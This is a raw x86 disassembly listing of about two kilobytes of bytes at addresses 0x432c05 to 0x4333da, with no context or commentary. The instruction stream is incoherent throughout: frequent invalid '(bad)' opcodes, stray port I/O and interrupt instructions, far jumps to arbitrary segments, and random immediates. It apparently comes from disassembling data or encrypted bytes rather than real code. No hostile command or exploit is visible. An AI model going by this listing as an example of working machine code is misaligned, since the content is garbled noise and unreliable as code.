  432c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432c06:	mov    bl,bl
  432c08:	sbb    eax,0xdfca4a0b
  432c0d:	pushf  
  432c0e:	lds    edx,FWORD PTR [edi-0x248ee292]
  432c14:	sub    edx,DWORD PTR gs:[esp+eax*4]
  432c18:	fadd   QWORD PTR [ebx-0xbfc7f8f]
  432c1e:	outs   dx,BYTE PTR ds:[esi]
  432c1f:	(bad)  [esi-0x1a0aa44b]
  432c25:	mov    dh,0x70
  432c27:	mov    edi,0x637a23ae
  432c2c:	mov    ah,0xb5
  432c2e:	stos   DWORD PTR es:[edi],eax
  432c2f:	and    dl,BYTE PTR [ecx]
  432c31:	sub    al,0x80
  432c33:	(bad)  
  432c34:	out    dx,eax
  432c35:	sti    
  432c36:	call   0x85232d11
  432c3b:	mov    bl,0xb1
  432c3d:	ret    
  432c3e:	pop    esi
  432c3f:	mov    ch,0x38
  432c41:	test   eax,0x11741762
  432c46:	stos   DWORD PTR es:[edi],eax
  432c47:	pop    esp
  432c48:	outs   dx,DWORD PTR ds:[esi]
  432c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432c4a:	jl     0x432c52
  432c4c:	xor    eax,0x6019b155
  432c51:	cmp    ch,BYTE PTR [eax]
  432c53:	loop   0x432c29
  432c55:	add    al,0x17
  432c57:	fidiv  DWORD PTR [ebx+0x8ef7cd1]
  432c5d:	ror    DWORD PTR [edx+edi*1+0x2bb46e8],1
  432c64:	ins    BYTE PTR es:[edi],dx
  432c65:	test   DWORD PTR [esp+ebp*2-0x44],eax
  432c69:	sub    al,0x34
  432c6b:	xchg   esp,eax
  432c6c:	inc    esp
  432c6d:	push   edi
  432c6e:	push   esp
  432c6f:	pop    ss
  432c70:	cs push ecx
  432c72:	mov    eax,ds:0xdbebb5
  432c77:	inc    eax
  432c78:	sbb    esi,eax
  432c7a:	mov    WORD PTR ss:[edi],?
  432c7d:	enter  0xb8c,0x2d
  432c81:	jg     0x432cec
  432c83:	out    0x89,al
  432c85:	mov    al,0x0
  432c87:	sbb    DWORD PTR [eax],edx
  432c89:	add    bh,al
  432c8b:	jns    0x432c2b
  432c8d:	fs jle 0x432d05
  432c90:	imul   esi,DWORD PTR [ebx],0xffffffce
  432c93:	es int 0xed
  432c96:	pop    ecx
  432c97:	inc    esp
  432c98:	sti    
  432c99:	jae    0x432c76
  432c9b:	ins    DWORD PTR es:[edi],dx
  432c9c:	jmp    0x432ca6
  432c9e:	inc    esi
  432c9f:	int    0x17
  432ca1:	loope  0x432cae
  432ca3:	jo     0x432c5a
  432ca5:	pop    esp
  432ca6:	out    0xb6,eax
  432ca8:	lods   eax,DWORD PTR ds:[esi]
  432ca9:	fmul   DWORD PTR [edx]
  432cab:	sbb    al,0x2
  432cad:	test   al,0xa5
  432caf:	adc    BYTE PTR [edx+0x29b51ed],ch
  432cb5:	pop    eax
  432cb6:	pop    edi
  432cb7:	pop    ebp
  432cb8:	fs sub ebp,ebp
  432cbb:	add    ch,BYTE PTR [eax+0x43]
  432cbe:	mov    ebp,0x6971497b
  432cc3:	fwait
  432cc4:	loopne 0x432d1c
  432cc6:	fcom   DWORD PTR [ecx+edi*8-0x7d]
  432cca:	sbb    eax,DWORD PTR [ebp-0x3bcd2d7d]
  432cd0:	(bad)  
  432cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432cd2:	adc    BYTE PTR [eax-0x524b4630],0x9a
  432cd9:	mov    BYTE PTR [esi],dh
  432cdb:	add    DWORD PTR [edx],edi
  432cdd:	hlt    
  432cde:	pop    ebx
  432cdf:	(bad)  
  432ce0:	daa    
  432ce1:	mov    ds:0xe6dc154d,al
  432ce6:	in     al,0xd9
  432ce8:	jle    0x432d11
  432cea:	mov    al,ds:0x3add441d
  432cef:	adc    eax,0x91ec1d71
  432cf4:	adc    eax,0xa1b14024
  432cf9:	adc    cl,0xf2
  432cfc:	or     esp,DWORD PTR [esi+0x1a]
  432cff:	or     ch,BYTE PTR [esi+0x74]
  432d02:	or     ebp,DWORD PTR [esi+ecx*2+0x4]
  432d06:	push   0xa88e0f04
  432d0b:	mov    edx,0xb8890b96
  432d10:	sbb    bh,ah
  432d12:	sub    BYTE PTR [ebx+0x17],cl
  432d15:	fiadd  DWORD PTR [ebx+0x7a885c23]
  432d1b:	ficom  WORD PTR [eax-0x13]
  432d1e:	push   ss
  432d1f:	ss fist WORD PTR cs:[ebx+0x2d00e822]
  432d27:	cwde   
  432d28:	cmc    
  432d29:	and    DWORD PTR [ebx-0x3],esi
  432d2c:	dec    ecx
  432d2d:	sbb    bh,BYTE PTR [eax+0x548e58aa]
  432d33:	jbe    0x432ceb
  432d35:	mov    ch,0xb
  432d37:	sbb    BYTE PTR [eax+0x15],0x1
  432d3b:	jg     0x432d95
  432d3d:	and    BYTE PTR [ecx+0x48c2ca95],0x58
  432d44:	fdivr  st,st(6)
  432d46:	mov    edx,ebx
  432d48:	ins    BYTE PTR es:[edi],dx
  432d49:	fwait
  432d4a:	add    BYTE PTR [eax+0x1d],ah
  432d4d:	jecxz  0x432da0
  432d4f:	loopne 0x432d5c
  432d51:	or     edi,ebx
  432d53:	mov    dh,0x5b
  432d55:	inc    ebx
  432d56:	sub    eax,0xf0aa1a29
  432d5b:	loopne 0x432d67
  432d5d:	out    0x1d,al
  432d5f:	add    BYTE PTR [edx+0x5d435698],al
  432d65:	sub    BYTE PTR [edi],bl
  432d67:	das    
  432d68:	adc    ch,BYTE PTR [esi]
  432d6a:	inc    esi
  432d6b:	fldenv [esi+0x79db0b8a]
  432d71:	xlat   BYTE PTR ds:[ebx]
  432d72:	mov    cl,0xb8
  432d74:	jmp    0x8e08f276
  432d79:	test   DWORD PTR [ebp+0x6120e438],ecx
  432d7f:	(bad)  
  432d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432d81:	cld    
  432d82:	mov    ds:0x47605b6,al
  432d87:	mov    eax,ds:0xb51872b5
  432d8c:	mov    ecx,0x86808d6a
  432d91:	fisubr DWORD PTR [edx+0x38300d77]
  432d97:	inc    ebp
  432d98:	mov    cl,0xa3
  432d9a:	mov    al,ds:0xd6a8a0f5
  432d9f:	fsubr  DWORD PTR [esi]
  432da1:	ins    BYTE PTR es:[edi],dx
  432da2:	or     eax,0x9980ce73
  432da7:	jo     0x432dbf
  432da9:	xchg   edi,eax
  432daa:	inc    ecx
  432dab:	(bad)  
  432dad:	xchg   edi,eax
  432dae:	mov    dh,0x86
  432db0:	cvtps2pd xmm1,QWORD PTR [ecx+edx*1+0x2021d61a]
  432db8:	outs   dx,BYTE PTR ds:[esi]
  432db9:	or     ebx,DWORD PTR ds:0xa56d7b37
  432dbf:	mov    DWORD PTR [edx-0x3ebacb7e],ebp
  432dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432dc6:	xchg   ecx,eax
  432dc7:	pop    es
  432dc8:	push   ss
  432dc9:	pop    esi
  432dca:	jl     0x432d51
  432dcc:	jbe    0x432d77
  432dce:	add    eax,ecx
  432dd0:	dec    ebp
  432dd1:	sahf   
  432dd2:	dec    ebx
  432dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432dd4:	test   ebx,ebx
  432dd6:	(bad)  
  432dd7:	adc    eax,0x71a0cfc0
  432ddc:	xchg   ebx,eax
  432ddd:	mov    al,0x3d
  432ddf:	fwait
  432de0:	and    al,0xdb
  432de2:	mov    dh,0xe5
  432de4:	lea    ecx,[ebx]
  432de6:	cmp    al,0x13
  432de8:	add    BYTE PTR [ebx],bl
  432dea:	push   edi
  432deb:	leave  
  432dec:	mov    esp,0x41f88e1a
  432df1:	mov    bh,0x65
  432df3:	popa   
  432df4:	mov    eax,0xaa91c04f
  432df9:	shr    DWORD PTR [edi-0x7f],1
  432dfc:	clc    
  432dfd:	pusha  
  432dfe:	add    esi,eax
  432e00:	and    BYTE PTR [ebx-0x3ed7d96b],0xad
  432e07:	cld    
  432e08:	inc    edx
  432e09:	les    esi,FWORD PTR [eax+0xcf10064]
  432e0f:	lods   eax,DWORD PTR ds:[esi]
  432e10:	jmp    0x432e72
  432e12:	ins    BYTE PTR es:[edi],dx
  432e13:	sub    bl,al
  432e15:	adc    BYTE PTR [ebx+0x4808144f],ah
  432e1b:	aam    0xa8
  432e1d:	ins    DWORD PTR es:[edi],dx
  432e1e:	push   edi
  432e1f:	push   eax
  432e20:	sub    eax,0xcb36122
  432e25:	fidiv  DWORD PTR [esi-0x5d]
  432e28:	adc    DWORD PTR [ebx+esi*4+0x717cab30],0x1414383c
  432e33:	xchg   edi,eax
  432e34:	push   ss
  432e35:	dec    edi
  432e36:	inc    DWORD PTR [ecx+0x42]
  432e39:	scas   al,BYTE PTR es:[edi]
  432e3a:	xor    eax,0x91dafd54
  432e3f:	stc    
  432e40:	push   esp
  432e41:	lods   al,BYTE PTR ds:[esi]
  432e42:	dec    esi
  432e43:	and    DWORD PTR [ebx-0x15],ebx
  432e46:	add    DWORD PTR [ecx-0x25],esi
  432e49:	or     al,0x20
  432e4b:	push   cs
  432e4c:	adc    edi,DWORD PTR [edx+ecx*2-0x4e45d52b]
  432e53:	rcl    bh,1
  432e55:	xchg   esp,eax
  432e56:	and    al,BYTE PTR [eax-0x3977fca9]
  432e5c:	(bad)  
  432e5d:	add    BYTE PTR [ebx+eax*8-0x14],ch
  432e61:	jns    0x432de4
  432e63:	push   es
  432e64:	out    0x5,al
  432e66:	or     al,0x1a
  432e68:	test   al,0xb6
  432e6a:	(bad)  [ebx]
  432e6c:	xlat   BYTE PTR ds:[ebx]
  432e6d:	mov    al,0xf6
  432e6f:	add    al,dh
  432e71:	add    bh,BYTE PTR [edi+0x1750da08]
  432e77:	mov    al,ds:0x9f4fc132
  432e7c:	neg    edx
  432e7e:	adc    al,0xdc
  432e80:	cmp    ch,BYTE PTR [edx-0x72c3afbf]
  432e86:	sbb    edi,DWORD PTR [esi]
  432e88:	push   ecx
  432e89:	jo     0x432ef6
  432e8b:	test   eax,0xcbf0d729
  432e90:	call   0xc4b8c9f6
  432e95:	and    eax,0xa40700c2
  432e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e9b:	jae    0x432e4b
  432e9d:	test   al,0xd8
  432e9f:	add    DWORD PTR [edx-0x8],eax
  432ea2:	adc    edx,eax
  432ea4:	ret    0x6d04
  432ea7:	mov    bh,0x73
  432ea9:	pop    ss
  432eaa:	or     eax,0x391523d0
  432eaf:	xor    eax,0x4e017055
  432eb4:	fst    QWORD PTR [edx+0x6]
  432eb7:	std    
  432eb8:	fdiv   QWORD PTR [esi-0x73cdd1d1]
  432ebe:	xor    edi,ecx
  432ec0:	jnp    0x432ed9
  432ec2:	mov    dl,0x5f
  432ec4:	les    edx,FWORD PTR [eax]
  432ec6:	add    al,0xb1
  432ec8:	fsub   QWORD PTR [eax-0x70b7e4f2]
  432ece:	mov    eax,0x2ef68815
  432ed3:	loope  0x432f40
  432ed5:	test   eax,0x945de647
  432eda:	test   al,0x6d
  432edc:	mov    edi,0x6562b7f0
  432ee1:	rcr    BYTE PTR [esi-0x55c4ff34],0x6e
  432ee8:	outs   dx,DWORD PTR ds:[esi]
  432ee9:	sub    al,0x6d
  432eeb:	(bad)  
  432eed:	xchg   esp,eax
  432eee:	inc    edx
  432eef:	sbb    edx,DWORD PTR [ebp+0x53]
  432ef2:	xchg   DWORD PTR [ebx],edi
  432ef4:	sar    esi,0x7a
  432ef7:	push   esi
  432ef8:	and    dh,BYTE PTR [esi]
  432efa:	retf   0xb4bf
  432efd:	inc    ebp
  432efe:	xor    BYTE PTR [edx],0x1a
  432f01:	cmp    BYTE PTR [eax+0x86b55c1],0x21
  432f08:	(bad)  
  432f09:	stos   BYTE PTR es:[edi],al
  432f0a:	fsub   DWORD PTR [edx-0x57]
  432f0d:	fnstsw WORD PTR [ebp+0x61]
  432f10:	ss jmp 0x8c21a369
  432f16:	ins    DWORD PTR es:[edi],dx
  432f17:	and    ch,BYTE PTR [edx+0x58]
  432f1a:	jmp    0x432f64
  432f1c:	call   0xb6c1:0x7d18892
  432f23:	mov    eax,ds:0xf3055cfa
  432f28:	add    al,ch
  432f2a:	jmp    0x432f76
  432f2c:	enter  0xa6c2,0xda
  432f30:	inc    ebp
  432f31:	cld    
  432f32:	mov    cl,BYTE PTR [ebx+0x59]
  432f35:	jmp    0x432f6e
  432f37:	push   ebp
  432f38:	push   0x3fc2c403
  432f3d:	xchg   esp,eax
  432f3e:	pop    ss
  432f3f:	xor    eax,DWORD PTR [edx]
  432f41:	inc    ecx
  432f42:	mov    ds:0x81a8ead8,eax
  432f47:	mov    ds:0xc7de394,eax
  432f4c:	mov    ah,0x4b
  432f4e:	pop    ebx
  432f4f:	and    BYTE PTR [eax+0x3e],0xef
  432f53:	inc    eax
  432f54:	xor    ebx,0x32
  432f57:	adc    DWORD PTR [ebp-0x25],esi
  432f5a:	repnz push es
  432f5c:	pop    ecx
  432f5d:	push   0x176b89c4
  432f62:	loop   0x432f39
  432f64:	dec    eax
  432f65:	mov    ch,0xc0
  432f67:	xchg   cl,bh
  432f69:	pop    edi
  432f6a:	lds    esi,FWORD PTR [esi-0xe8fee30]
  432f70:	add    esp,eax
  432f72:	push   es
  432f73:	std    
  432f74:	and    BYTE PTR [eax+eax*1-0x1c2f52fc],0xf8
  432f7c:	mov    ds,WORD PTR [ebx-0x27]
  432f7f:	mov    eax,0xe1dbbcd1
  432f84:	(bad)  
  432f85:	cvtpi2pd xmm1,QWORD PTR [ebx]
  432f89:	pop    ds
  432f8a:	mov    ds:0x24b62809,eax
  432f8f:	pop    esp
  432f90:	stos   BYTE PTR es:[edi],al
  432f91:	mov    ecx,0xbb680333
  432f96:	lock jne 0x432fa7
  432f99:	mov    cl,0x5e
  432f9b:	or     al,0x1c
  432f9d:	enter  0xa42e,0xa0
  432fa1:	lods   eax,DWORD PTR ds:[esi]
  432fa2:	pop    ebp
  432fa3:	jmp    0x610d:0x29d1f100
  432faa:	aam    0x20
  432fac:	xchg   esi,eax
  432fad:	jbe    0x432fb3
  432faf:	(bad)
  432fb3:	fmul   QWORD PTR [ebp-0x41]
  432fb6:	xchg   esi,eax
  432fb7:	stos   BYTE PTR es:[edi],al
  432fb8:	lea    eax,[esi+0x36b98682]
  432fbe:	rcr    bl,1
  432fc0:	outs   dx,BYTE PTR ds:[esi]
  432fc1:	or     esp,DWORD PTR [ebp-0x1a902a4]
  432fc7:	fisubr DWORD PTR [edx-0x8]
  432fca:	lods   al,BYTE PTR ds:[esi]
  432fcb:	cwde   
  432fcc:	add    DWORD PTR [edx],edi
  432fce:	mov    BYTE PTR [eax+0x29],ah
  432fd1:	push   cs
  432fd2:	bound  eax,QWORD PTR [edx+0x6d45a169]
  432fd8:	(bad)  
  432fd9:	fwait
  432fda:	add    bh,BYTE PTR [edx]
  432fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432fdd:	adc    DWORD PTR [edx-0x80],ebx
  432fe0:	mov    dh,0x70
  432fe2:	test   al,0x99
  432fe4:	inc    eax
  432fe5:	stos   DWORD PTR es:[edi],eax
  432fe6:	sub    DWORD PTR [ebx],edx
  432fe8:	sub    BYTE PTR [ecx],dl
  432fea:	(bad)  [eax+0x0]
  432fed:	mov    edi,0x6125d2de
  432ff2:	jmp    0x5f69:0xb4db6228
  432ff9:	jge    0x433058
  432ffb:	or     DWORD PTR [eax],esp
  432ffd:	loopne 0x432f9f
  432fff:	pop    eax
  433000:	cmp    BYTE PTR [eax],0x2b
  433003:	ins    BYTE PTR es:[edi],dx
  433004:	mov    dh,0xa1
  433006:	jmp    0xbed6:0x30483952
  43300d:	or     eax,0x9ba8ae4a
  433012:	mov    eax,ds:0x15137123
  433017:	pusha  
  433018:	aam    0x10
  43301a:	rcl    dl,0xd7
  43301d:	fiadd  DWORD PTR [ecx+0x62]
  433020:	xlat   BYTE PTR ds:[ebx]
  433021:	xor    eax,0x5a1701d6
  433026:	(bad)  
  433027:	in     eax,0x6c
  433029:	or     ecx,edi
  43302b:	sar    ebx,1
  43302d:	jno    0x43309a
  43302f:	sub    ch,0xa9
  433032:	pusha  
  433033:	xlat   BYTE PTR ds:[ebx]
  433034:	stos   BYTE PTR es:[edi],al
  433035:	popf   
  433036:	btr    ecx,ebp
  433039:	and    DWORD PTR [ebx-0x45],ebx
  43303c:	xor    eax,0x9b145154
  433041:	icebp  
  433042:	retf   0x176e
  433045:	arpl   WORD PTR [eax+ebp*4-0x75],bx
  433049:	mov    bl,ah
  43304b:	scas   eax,DWORD PTR es:[edi]
  43304c:	push   es
  43304d:	clc    
  43304e:	or     ebx,ebp
  433050:	push   0x3451c15
  433055:	ins    BYTE PTR es:[edi],dx
  433056:	and    eax,0xad1b6ed0
  43305b:	and    DWORD PTR [ecx-0x68],edx
  43305e:	cwde   
  43305f:	inc    ebp
  433060:	enter  0x2d4a,0x51
  433064:	mov    ebx,0x7df219b4
  433069:	pop    eax
  43306a:	push   ecx
  43306b:	push   cs
  43306c:	arpl   WORD PTR [ecx+0x415da08e],si
  433072:	inc    edi
  433073:	cmp    BYTE PTR [edx],al
  433075:	inc    edx
  433076:	fild   DWORD PTR [edx-0x75]
  433079:	mov    dh,0xb8
  43307b:	pop    ecx
  43307c:	xor    bh,BYTE PTR [ebx]
  43307e:	pop    esi
  43307f:	cmp    dh,BYTE PTR ds:0x8a8e85c3
  433085:	outs   dx,BYTE PTR ds:[esi]
  433086:	sbb    eax,0x853f2e81
  43308b:	push   ebp
  43308c:	cmovno ecx,DWORD PTR ds:0x3b46ccd0
  433093:	xchg   edi,eax
  433094:	pop    ebx
  433095:	js     0x4330c3
  433097:	xchg   edi,eax
  433098:	sbb    dl,BYTE PTR [ebp+0xf]
  43309b:	sahf   
  43309c:	xchg   ebx,eax
  43309d:	jns    0x43310e
  43309f:	xchg   esi,eax
  4330a0:	pop    ebx
  4330a1:	or     eax,0x70ac5854
  4330a6:	ds mov al,0x72
  4330a9:	sub    BYTE PTR [esi-0x59a2764a],dh
  4330af:	cmp    eax,DWORD PTR ds:0xa09ab19e
  4330b5:	fidiv  DWORD PTR [esi-0x4a43a9ea]
  4330bb:	and    DWORD PTR [edi+0x1617689a],ebx
  4330c1:	scas   eax,DWORD PTR es:[edi]
  4330c2:	pushf  
  4330c3:	fs push edi
  4330c5:	jae    0x43310e
  4330c7:	sbb    DWORD PTR [ebx-0x7e],esi
  4330ca:	mov    eax,DWORD PTR [esi]
  4330cc:	mov    ds:0x433949c7,al
  4330d1:	push   eax
  4330d2:	mov    ebx,0x101ce80a
  4330d7:	das    
  4330d8:	inc    edx
  4330d9:	mov    edx,0xdb6db6a
  4330de:	test   DWORD PTR [esi+ecx*4],ebp
  4330e1:	add    bl,BYTE PTR [edx-0x6b557aa7]
  4330e7:	dec    ebp
  4330e8:	push   ebp
  4330e9:	ins    DWORD PTR es:[edi],dx
  4330ea:	or     cl,0x7b
  4330ed:	ins    BYTE PTR es:[edi],dx
  4330ee:	scas   al,BYTE PTR es:[edi]
  4330ef:	inc    edx
  4330f0:	(bad)  
  4330f1:	int    0xd0
  4330f3:	add    dl,BYTE PTR [ecx+0x1]
  4330f6:	mov    esp,0x5818d4e6
  4330fb:	fadd   DWORD PTR [ebp-0x49]
  4330fe:	mov    eax,ds:0xf2e13356
  433103:	into   
  433104:	dec    esi
  433105:	xor    al,0xa9
  433107:	add    ch,al
  433109:	cs pop edx
  43310b:	xchg   ecx,eax
  43310c:	outs   dx,BYTE PTR ds:[esi]
  43310d:	out    0x88,al
  43310f:	test   al,0x6a
  433111:	mov    ds:0x6096d6e8,al
  433116:	jmp    0x215cc2d
  43311b:	push   es
  43311c:	je     0x43312e
  43311e:	pop    ebp
  43311f:	jge    0x43319e
  433121:	in     al,dx
  433122:	imul   edx,ebx,0x18
  433125:	stos   BYTE PTR es:[edi],al
  433126:	mov    dh,0xd
  433128:	aam    0xab
  43312a:	leave  
  43312b:	mov    esp,0x88935311
  433130:	or     eax,0x37029b41
  433135:	mov    eax,ds:0x7137836a
  43313a:	mov    ds:0x941a9b6d,eax
  43313f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433140:	sub    al,0xd2
  433142:	mov    eax,ds:0xbb39c4b1
  433147:	stos   BYTE PTR es:[edi],al
  433148:	jbe    0x43318a
  43314a:	inc    esp
  43314b:	cli    
  43314c:	or     BYTE PTR [edx+0x6176dc74],al
  433152:	test   eax,0x232baa6d
  433157:	(bad)
  43315b:	cmc    
  43315c:	imul   ebx,DWORD PTR [ebx+0x57],0x0
  433160:	fist   DWORD PTR [esi+0x69f20ee9]
  433166:	cwde   
  433167:	adc    DWORD PTR [eax],eax
  433169:	shr    BYTE PTR [esi],0xa2
  43316c:	xor    eax,0xdafe6bd5
  433171:	cmp    ch,BYTE PTR [eax]
  433173:	ss jl  0x4331de
  433176:	inc    ebp
  433177:	repz scas eax,DWORD PTR es:[edi]
  433179:	stos   BYTE PTR es:[edi],al
  43317a:	jbe    0x433101
  43317c:	test   al,0xb6
  43317e:	fld    QWORD PTR [ebp+0x7a9512ed]
  433184:	pop    ecx
  433185:	and    al,0x69
  433187:	mov    ecx,0x843c8dfc
  43318c:	mov    al,ds:0xfde700
  433191:	sar    WORD PTR [esi+0x223b8c30],0x2e
  433199:	aad    0x62
  43319b:	push   ecx
  43319c:	pop    ss
  43319d:	adc    ecx,DWORD PTR [ebx+esi*4+0x110d8d6]
  4331a4:	sbb    dl,BYTE PTR [ecx]
  4331a6:	das    
  4331a7:	ror    dh,0x2d
  4331aa:	sub    al,0x2c
  4331ac:	(bad)  [ebx+edi*8]
  4331af:	lods   al,BYTE PTR ds:[esi]
  4331b0:	stos   BYTE PTR es:[edi],al
  4331b1:	push   0x20
  4331b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4331b4:	xor    DWORD PTR [ebp-0x404917d7],0x7381ce03
  4331be:	dec    edx
  4331bf:	imul   esi,esi,0x60
  4331c2:	mov    ebx,0x9f8a5035
  4331c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4331c8:	inc    esi
  4331c9:	sub    eax,0x2da2fbb0
  4331ce:	stos   BYTE PTR es:[edi],al
  4331cf:	add    DWORD PTR es:[edx],esi
  4331d2:	sahf   
  4331d3:	outs   dx,DWORD PTR ds:[esi]
  4331d4:	adc    eax,0x5406b62a
  4331d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4331da:	and    BYTE PTR [edi-0x47d7931c],dl
  4331e0:	mov    al,0xf5
  4331e2:	test   DWORD PTR [esi-0x6a],eax
  4331e5:	rcr    BYTE PTR [ebp+0x6c40a211],cl
  4331eb:	dec    ebp
  4331ec:	push   eax
  4331ed:	cmp    bh,BYTE PTR [ebx]
  4331ef:	and    BYTE PTR ds:0xb44176fc,bh
  4331f5:	(bad)  
  4331f6:	ror    BYTE PTR [esi+0x5083188e],cl
  4331fc:	loop   0x43322c
  4331fe:	mov    eax,0xccf75035
  433203:	(bad)  
  433206:	rcl    DWORD PTR ds:0x74db6b71,cl
  43320c:	aam    0x32
  43320e:	bound  edi,QWORD PTR [ebp+0x2]
  433211:	xchg   BYTE PTR [eax],bh
  433213:	cs stos BYTE PTR es:[edi],al
  433215:	mov    eax,0xc21dee75
  43321a:	pop    ss
  43321b:	xlat   BYTE PTR ds:[ebx]
  43321c:	sub    BYTE PTR cs:[edx-0x49ea494a],bl
  433223:	mov    edi,eax
  433225:	bound  edx,QWORD PTR [edx-0x48bc24f9]
  43322b:	adc    ebx,DWORD PTR es:[eax+0xe]
  43322f:	mov    ecx,0x6b99865e
  433234:	(bad)  
  433235:	rcl    esi,1
  433237:	rol    DWORD PTR [edx],0xed
  43323a:	jg     0x433225
  43323c:	int3   
  43323d:	bound  ecx,QWORD PTR [ebx]
  43323f:	sub    eax,0x1941d42c
  433244:	fadd   QWORD PTR [esi+0x6d31fa5d]
  43324a:	rcl    DWORD PTR [esi-0x46],0x53
  43324e:	adc    ch,cl
  433250:	xchg   ebp,eax
  433251:	outs   dx,BYTE PTR ds:[esi]
  433252:	push   eax
  433253:	add    DWORD PTR [esi],esi
  433255:	test   BYTE PTR [edx*2+0xf68a247],0x4b
  43325d:	add    esp,DWORD PTR ds:[edx-0x7be1ea5]
  433264:	pop    ebx
  433265:	push   cs
  433266:	iret   
  433267:	and    ah,cl
  433269:	xor    eax,0x54ab7400
  43326e:	mov    ds:0xbb35a6b8,eax
  433273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433274:	mov    bl,BYTE PTR [eax-0x48]
  433277:	jmp    0x82475806
  43327c:	fild   DWORD PTR [esi+0x7b85028a]
  433282:	add    DWORD PTR [ebx-0x6d],edx
  433285:	mov    edx,0xa48a9600
  43328a:	mov    ds:0xdacb88c9,eax
  43328f:	adc    eax,0x1f6d1705
  433294:	sar    BYTE PTR [ecx],1
  433296:	push   ss
  433297:	cmp    eax,0x88e8386d
  43329c:	cwde   
  43329d:	mov    es,WORD PTR [eax-0x15a64997]
  4332a3:	mov    BYTE PTR [eax-0x32e16a62],bh
  4332a9:	retf   
  4332aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4332ab:	ds push eax
  4332ad:	mov    ch,BYTE PTR [ebp-0x3c783a8f]
  4332b3:	retf   
  4332b4:	das    
  4332b5:	or     bh,BYTE PTR cs:[bx+si+0x79b5]
  4332bb:	mov    esi,DWORD PTR [esi+0x9]
  4332be:	(bad)  
  4332bf:	xchg   edi,eax
  4332c0:	adc    al,0x5b
  4332c2:	fwait
  4332c3:	mov    edi,esi
  4332c5:	mov    cl,0xaa
  4332c7:	dec    ecx
  4332c8:	sub    esi,DWORD PTR [ebp+0x44fad882]
  4332ce:	fdivr  DWORD PTR [esi-0x6f]
  4332d1:	mov    ebx,0x1576032
  4332d6:	ins    BYTE PTR es:[edi],dx
  4332d7:	mov    BYTE PTR [esi],ah
  4332d9:	push   es
  4332da:	sbb    al,0xac
  4332dc:	(bad)  
  4332dd:	jne    0x4332f3
  4332df:	cmp    eax,DWORD PTR [eax+0x445513dc]
  4332e5:	xchg   ecx,eax
  4332e6:	mov    al,ds:0xa4b12c44
  4332eb:	sub    cl,BYTE PTR ds:0x14d65c4c
  4332f1:	mov    ah,0xdd
  4332f3:	sahf   
  4332f4:	inc    ebx
  4332f5:	xchg   ebp,eax
  4332f6:	in     al,dx
  4332f7:	in     al,dx
  4332f8:	fwait
  4332f9:	sub    al,0xbc
  4332fb:	pop    edx
  4332fc:	jmp    0x2fe3:0x9d5be888
  433303:	lods   eax,DWORD PTR ds:[esi]
  433304:	or     eax,0x15b5528
  433309:	xor    eax,0xd0cf026
  43330e:	adc    al,0x70
  433310:	pop    ebx
  433311:	in     eax,0x40
  433313:	mov    ecx,0x7e4c9755
  433318:	ins    DWORD PTR es:[edi],dx
  433319:	mov    eax,ds:0x8806aa03
  43331e:	mov    bl,0xdc
  433320:	jmp    DWORD PTR [ebx]
  433322:	(bad)  
  433323:	pop    ebx
  433324:	add    edx,eax
  433326:	shr    DWORD PTR cs:[edi],0x55
  43332a:	das    
  43332b:	sbb    DWORD PTR [eax-0x31],ebx
  43332e:	push   eax
  43332f:	pop    ss
  433330:	push   ss
  433331:	mov    dh,0x2
  433333:	mov    dh,0xb8
  433335:	xchg   ecx,eax
  433336:	cld    
  433337:	adc    bl,al
  433339:	stc    
  43333a:	mov    ch,0x4b
  43333c:	ins    DWORD PTR es:[edi],dx
  43333d:	inc    ebx
  43333e:	mov    bl,0x36
  433340:	and    BYTE PTR [ecx+0x5f],al
  433343:	cmp    dh,BYTE PTR [ebx-0x5c]
  433346:	fdivr  DWORD PTR [edx]
  433348:	mov    BYTE PTR [edx-0x3fbeb853],bh
  43334e:	and    edx,DWORD PTR [ebp+0x56c2c22f]
  433354:	or     BYTE PTR [ecx*2-0x6213b989],bh
  43335b:	les    eax,FWORD PTR [esi]
  43335d:	push   eax
  43335e:	loope  0x4332fe
  433360:	ins    DWORD PTR es:[edi],dx
  433361:	test   DWORD PTR [ebx+0x3b],0x40d6db88
  433368:	mov    edi,0x7d10982b
  43336d:	rcl    DWORD PTR [edi+0xa683ad8],cl
  433373:	test   al,0x59
  433375:	push   cs
  433376:	sub    BYTE PTR [eax-0x5975e9de],bl
  43337c:	add    ch,BYTE PTR [ecx]
  43337e:	mov    ebp,0x2d516bae
  433383:	ins    DWORD PTR es:[edi],dx
  433384:	sub    BYTE PTR [ecx+eax*2],cl
  433387:	add    al,0xce
  433389:	pop    edi
  43338a:	inc    esp
  43338b:	cld    
  43338c:	push   0xffffffdb
  43338e:	dec    esp
  43338f:	fnsave [ecx]
  433391:	xchg   edx,eax
  433392:	js     0x43337d
  433394:	sub    BYTE PTR [edi],ch
  433396:	lods   eax,DWORD PTR ds:[esi]
  433397:	add    eax,DWORD PTR [edx-0x2fec31a3]
  43339d:	mov    eax,0x75b6ad49
  4333a2:	inc    ebp
  4333a3:	fstp   TBYTE PTR [esi+0x3]
  4333a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4333a8:	mov    ds:0xfb1735d3,eax
  4333ad:	xor    al,0x1c
  4333af:	rcl    ch,1
  4333b1:	out    dx,al
  4333b2:	pop    ecx
  4333b3:	dec    edx
  4333b4:	aas    
  4333b5:	rol    DWORD PTR ds:0x9d2da962,0xe1
  4333bc:	push   0x5d341a02
  4333c1:	cmp    BYTE PTR [eax-0x479a0c4a],cl
  4333c7:	xor    bh,BYTE PTR [edx-0x57f65296]
  4333cd:	or     esi,DWORD PTR [ebp+0x350a1451]
  4333d3:	repnz fist DWORD PTR [esi-0x56c97a36]
  4333da:	dec    eax
